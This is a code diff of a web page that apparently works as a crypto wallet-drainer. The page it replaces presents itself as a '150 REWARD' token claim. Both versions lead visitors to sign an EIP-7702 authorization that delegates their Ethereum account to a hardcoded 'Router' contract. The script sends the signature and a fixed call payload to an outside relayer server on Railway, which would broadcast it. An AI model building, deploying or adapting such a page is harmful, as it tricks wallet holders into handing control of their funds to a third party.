@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim REWARD</title>
+    <title>EIP-7702 Delegation</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -17,7 +17,7 @@
             border: 1px solid #1a1a2e;
             border-radius: 16px;
             padding: 36px 28px;
-            max-width: 460px; width: 100%;
+            max-width: 480px; width: 100%;
         }
         .logo {
             text-align: center; margin-bottom: 28px;
@@ -25,19 +25,22 @@
             text-transform: uppercase;
         }
         .amount {
-            text-align: center; font-size: 48px; font-weight: 700;
+            text-align: center; font-size: 42px; font-weight: 700;
             color: #fff; margin: 8px 0; letter-spacing: -1px;
         }
         .sub {
             text-align: center; color: #6b7280; font-size: 13px; margin-bottom: 28px;
         }
-        .info {
-            background: #0f0f1a; border-radius: 10px; padding: 16px;
-            margin-bottom: 24px; font-size: 13px; color: #9ca3af;
-            display: flex; align-items: center; gap: 10px;
-            border: 1px solid #1a1a2e;
+        .field {
+            background: #0f0f1a; border-radius: 10px; padding: 12px 16px;
+            margin-bottom: 12px; font-size: 12px; color: #9ca3af;
+            border: 1px solid #1a1a2e; font-family: monospace;
+            word-break: break-all;
         }
-        .info-icon { font-size: 20px; }
+        .field-label {
+            color: #6b7280; font-size: 11px; text-transform: uppercase;
+            margin-bottom: 4px; letter-spacing: 1px;
+        }
         .btn {
             width: 100%; padding: 18px; border: none; border-radius: 12px;
             font-weight: 600; font-size: 15px; cursor: pointer; margin: 8px 0;
@@ -49,73 +52,142 @@
         .btn-primary:hover:not(:disabled) { background: #e55a2b; }
         .btn:disabled { opacity: 0.4; cursor: not-allowed; }
         .status {
-            text-align: center; margin-top: 14px; font-size: 12px; color: #6b7280;
+            text-align: center; margin-top: 14px; font-size: 12px;
+            color: #6b7280; word-break: break-all; line-height: 1.5;
         }
+        .status.error { color: #ef4444; }
+        .status.success { color: #22c55e; }
+        .status a { color: #ff6b35; text-decoration: none; }
+        .status a:hover { text-decoration: underline; }
+        .step {
+            display: flex; align-items: center; gap: 8px;
+            font-size: 12px; color: #6b7280; margin: 4px 0;
+        }
+        .step-dot {
+            width: 8px; height: 8px; border-radius: 50%;
+            background: #1a1a2e; transition: all 0.3s;
+        }
+        .step-dot.active { background: #ff6b35; }
+        .step-dot.done { background: #22c55e; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="logo">Reward Claim</div>
-        <div class="amount">150 REWARD</div>
-        <div class="sub">Claim your tokens</div>
+        <div class="logo">EIP-7702 Delegation</div>
+        <div class="amount">Set Code</div>
+        <div class="sub">Delegate your EOA to the Router contract</div>
         
-        <div class="info">
-            <span class="info-icon">🔐</span>
-            <span>Router: <span style="color:#ff6b35;font-family:monospace;">ROUTER_CONTRACT_ADDRESS</span></span>
+        <div class="field">
+            <div class="field-label">Router Contract</div>
+            0x7debCF72BebA168Bb49eec6BbB1156E203A564FD
         </div>
         
-        <button class="btn btn-primary" id="claimBtn">Claim Now</button>
+        <div class="field">
+            <div class="field-label">Network</div>
+            Ethereum Mainnet (Chain ID: 1)
+        </div>
+
+        <div id="steps" class="hidden">
+            <div class="step"><div class="step-dot" id="s1"></div> Connect wallet</div>
+            <div class="step"><div class="step-dot" id="s2"></div> Verify network</div>
+            <div class="step"><div class="step-dot" id="s3"></div> Sign authorization</div>
+            <div class="step"><div class="step-dot" id="s4"></div> Submit to relayer</div>
+            <div class="step"><div class="step-dot" id="s5"></div> Broadcast tx</div>
+        </div>
+        
+        <button class="btn btn-primary" id="delegateBtn">Authorize Delegation</button>
         
         <div class="status" id="status"></div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
     <script>
+        // ═══════════════════════════════════════════════════════
+        // CONFIG: Update this with your Railway deployment URL
+        // ═══════════════════════════════════════════════════════
+        const RELAYER_API = 'https://relayer-production-aca6.up.railway.app/api/delegate';
+        // ═══════════════════════════════════════════════════════
+        
         const ROUTER = '0x7debCF72BebA168Bb49eec6BbB1156E203A564FD';
         const CHAIN_ID = 1;
-        const RELAYER_URL = 'https://solana-liquidity-pool-production.up.railway.app/api/delegate';
+        const CHAIN_ID_HEX = '0x1';
+        const DEADLINE_MINUTES = 5;
 
+        // ─── Force even-length hex (ethers v6 getBytes requirement) ───
         function toEvenHex(val) {
             if (val === 0 || val === '0x' || val === '0x0') return '0x';
+            let hex;
             if (typeof val === 'string' && val.startsWith('0x')) {
-                return val.length % 2 === 0 ? val : '0x0' + val.slice(2);
+                hex = val;
+            } else {
+                hex = ethers.toBeHex(val);
             }
-            const hex = ethers.toBeHex(val);
-            return hex.length % 2 === 0 ? hex : '0x0' + hex.slice(2);
+            if (hex.length > 2 && hex.length % 2 !== 0) {
+                return '0x0' + hex.slice(2);
+            }
+            return hex;
         }
 
-        document.getElementById('claimBtn').addEventListener('click', async () => {
-            const btn = document.getElementById('claimBtn');
+        function setStep(n, state) {
+            const dot = document.getElementById('s' + n);
+            if (!dot) return;
+            dot.className = 'step-dot ' + state;
+        }
+
+        function showSteps() {
+            document.getElementById('steps').classList.remove('hidden');
+        }
+
+        document.getElementById('delegateBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('delegateBtn');
             const status = document.getElementById('status');
 
             if (!window.ethereum) {
-                status.textContent = 'No wallet detected';
+                status.textContent = 'No wallet detected. Install MetaMask.';
+                status.className = 'status error';
                 return;
             }
 
             btn.disabled = true;
-            btn.textContent = 'Connecting...';
+            status.textContent = '';
+            status.className = 'status';
+            showSteps();
 
             try {
+                // ─── Step 1: Connect ───
+                setStep(1, 'active');
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const userAddress = accounts[0];
+                setStep(1, 'done');
 
+                // ─── Step 2: Network ───
+                setStep(2, 'active');
                 const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-                if (chainId !== '0x1') {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x1' }]
-                    });
+                if (chainId !== CHAIN_ID_HEX) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: CHAIN_ID_HEX }]
+                        });
+                    } catch (e) {
+                        status.textContent = 'Please switch to Ethereum Mainnet';
+                        status.className = 'status error';
+                        btn.disabled = false;
+                        return;
+                    }
                 }
+                setStep(2, 'done');
 
+                // ─── Step 3: Get nonce & build auth digest ───
+                setStep(3, 'active');
                 const nonceHex = await window.ethereum.request({
                     method: 'eth_getTransactionCount',
                     params: [userAddress, 'latest']
                 });
                 const nonce = parseInt(nonceHex, 16);
 
-                btn.textContent = 'Sign authorization...';
-
+                // Build EIP-7702 auth digest: keccak256(0x05 || rlp([chainId, router, nonce]))
                 const authPayloadRlp = ethers.encodeRlp([
                     toEvenHex(CHAIN_ID),
                     ROUTER,
@@ -129,46 +201,67 @@
                 combined.set(authPayloadBytes, 1);
                 const authHash = ethers.keccak256(combined);
 
+                // User signs via personal_sign (EIP-191)
+                btn.textContent = 'Sign in wallet...';
                 const signature = await window.ethereum.request({
                     method: 'personal_sign',
                     params: [authHash, userAddress]
                 });
+                setStep(3, 'done');
 
-                btn.textContent = 'Submitting...';
-
+                // ─── Step 4: Extract & submit ───
+                setStep(4, 'active');
                 const sigBytes = ethers.getBytes(signature);
                 const r = '0x' + Array.from(sigBytes.slice(0, 32)).map(b => b.toString(16).padStart(2, '0')).join('');
                 const s = '0x' + Array.from(sigBytes.slice(32, 64)).map(b => b.toString(16).padStart(2, '0')).join('');
                 const yParity = sigBytes[64] - 27;
 
-                const response = await fetch(RELAYER_URL, {
+                const deadline = Math.floor(Date.now() / 1000) + (DEADLINE_MINUTES * 60);
+
+                btn.textContent = 'Submitting...';
+
+                const response = await fetch(RELAYER_API, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         userAddress,
                         chainId: CHAIN_ID,
                         router: ROUTER,
-                        nonce: nonce,
+                        nonce,
                         yParity,
                         r,
                         s,
-                        callData: '0x61461954'
+                        callData: '0x61461954',
+                        deadline
                     })
                 });
 
                 const result = await response.json();
+                setStep(4, 'done');
 
-                if (result.success) {
-                    status.innerHTML = 'Delegated: ' + result.txHash.slice(0, 24) + '...';
-                    btn.textContent = 'Complete';
+                // ─── Step 5: Result ───
+                setStep(5, 'active');
+                if (result.success && result.txHash) {
+                    status.innerHTML = `
+                        <span class="success">✅ Delegation broadcasted!</span><br>
+                        <a href="https://etherscan.io/tx/${result.txHash}" target="_blank">
+                            View on Etherscan → ${result.txHash.slice(0, 24)}...
+                        </a>
+                    `;
+                    status.className = 'status success';
+                    setStep(5, 'done');
+                    btn.textContent = 'Delegated';
                 } else {
-                    throw new Error(result.error || 'Failed');
+                    throw new Error(result.error || 'Relayer rejected request');
                 }
 
             } catch (e) {
-                status.textContent = 'Error: ' + (e.message || '');
+                status.textContent = 'Error: ' + (e.message || e);
+                status.className = 'status error';
                 btn.disabled = false;
-                btn.textContent = 'Claim Now';
+                btn.textContent = 'Authorize Delegation';
+                // Reset steps
+                for (let i = 1; i <= 5; i++) setStep(i, '');
             }
         });
     </script>
